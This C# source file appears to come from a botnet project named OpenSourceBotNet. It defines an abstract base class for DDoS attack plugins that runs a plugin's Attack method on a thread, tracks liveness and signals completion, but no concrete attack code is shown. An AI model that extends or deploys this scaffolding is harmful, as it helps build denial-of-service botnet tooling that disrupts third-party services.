using System;
using System.Collections.Generic;
using System.Text;

namespace OpenSourceBotNet.Plugins.Engines.Plugins.DDoS.Plugins
{
    public abstract class DDoSPluginPlugin
    {
        public delegate void FireFinished(string sPluginTaskKeyID);
        public event FireFinished _fireFinished;

        public System.Threading.Thread threadIgnition;

        public string sPluginName;
        public string sPluginTaskKeyID;

        public string[] sDDoSWork;

        public bool bFireFinished = false;
        public bool bAliveRequired = false;

        private DateTime dtLastActive;

        public DDoSPluginPlugin(string[] DDoSWork)
        {
            sDDoSWork = DDoSWork;

            Alive();
        }

        public abstract object[] Attack(string[] DDoSWork);
        public abstract void Stop();

        public void Start()
        {
            threadIgnition = new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(Ignition));
            threadIgnition.Start();

            Alive();
        }

        private void Ignition(object objGarbage)
        {
            object[] objReturned = Attack(sDDoSWork);

            Alive();
        }

        public void Alive()
        {
            dtLastActive = DateTime.Now;
        }

        public bool IsAlive()
        {
            if (bAliveRequired == false)
            {
                return true;
            }

            TimeSpan tsDifference = DateTime.Now.Subtract(dtLastActive);

            if (tsDifference.Minutes > 5)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        public void Shutdown()
        {
            Stop();

            try
            {
                threadIgnition.Abort();
            }
            catch (Exception ex)
            {

            }
        }

        public void fireFinished()
        {
            if (bFireFinished == false)
            {
                Alive();

                bFireFinished = true;

                _fireFinished(sPluginTaskKeyID);
            }
        }
    }
}
